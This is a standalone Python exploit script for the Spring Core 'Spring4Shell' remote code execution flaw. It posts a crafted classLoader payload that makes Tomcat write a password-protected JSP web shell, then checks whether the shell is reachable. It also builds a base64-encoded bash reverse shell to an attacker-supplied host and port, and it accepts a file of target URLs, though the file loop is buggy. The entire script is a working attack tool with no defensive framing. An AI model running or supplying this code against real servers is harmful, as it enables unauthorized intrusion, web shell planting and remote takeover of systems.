import requests
import argparse
from urllib.parse import urljoin
import base64

def make_runtime_payload(cmd, host=None, port=None):
    if host and port:
        bash_payload = base64.b64encode(f"bash -i >& /dev/tcp/{host}/{port} 0>&1".encode())
        # https://ares-x.com/tools/runtime-exec/
        payload = "bash -c {echo," + bash_payload.decode("utf-8")  + "}|{base64,-d}|{bash,-i}"
        payload = f'"{payload}"'
        return payload
    else:
        payload = f'"{cmd}"'
        return payload

def url_encode(text):
    return text.replace('/', '%2F').replace(' ', '%20').replace('=', '%3D').replace('&', '%26').replace('"', "%22").replace("'", "%27").replace('>', "%3E").replace('<', "%3C").replace('#', "%23").replace('?', "%3F").replace('+', "%2B")


def exploit(url, command, shell_name, password='1337'):
    print(f"418 - Trying to exploit {url}")
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"
        }
    # https://github.com/craig/SpringCore0day original exploit
    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{url_encode(password)}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec({url_encode(command)}).getInputStream();%20int%20a%20=%20-1;%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D;%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b));%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={shell_name}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    
    go = requests.post(url, headers=headers ,data=data, timeout=15, allow_redirects=False, verify=False)
    shellurl = urljoin(url, f'{shell_name}.jsp')
    shellgo = requests.get(shellurl, timeout=40, allow_redirects=False, verify=False)
    if shellgo.status_code == 200:
        print(f"{shellgo.status_code} - Successfuly exploited, access in: {shellurl}?pwd={url_encode(password)}")
    else:
        print(f"{shellgo.status_code} - {shellurl} is'n work :(")

def main():
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-f', '--file',help='File with a list of URLs (reverse-shell dont works here)', required=False)
    parser.add_argument('-u', '--url',help='Just one target URL', required=False)
    parser.add_argument('-c', '--command',help='Command to execute', required=False)
    parser.add_argument('--host', help='Host to connect if you want a reverse shell', required=False)
    parser.add_argument('--port', help='Port to connect if you want a reverse shell', required=False)
    parser.add_argument('--shell_name', help='Name of the shell', required=False, default="b1g0uS")
    parser.add_argument('--password', help='Password for shell', required=False, default='1337')
    args = parser.parse_args()
    
    if args.url:
        if args.command:
            exploit(args.url, make_runtime_payload(args.command), args.shell_name, password=args.password)
        elif args.host and args.port:
            exploit(args.url, make_runtime_payload(None, args.host, args.port), args.shell_name, password=args.password)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                exploit(args.url, make_runtime_payload(args.command), args.shell_name, password=args.password)

if __name__ == '__main__':
    print("SPRING CORE RCE. :)")
    main()
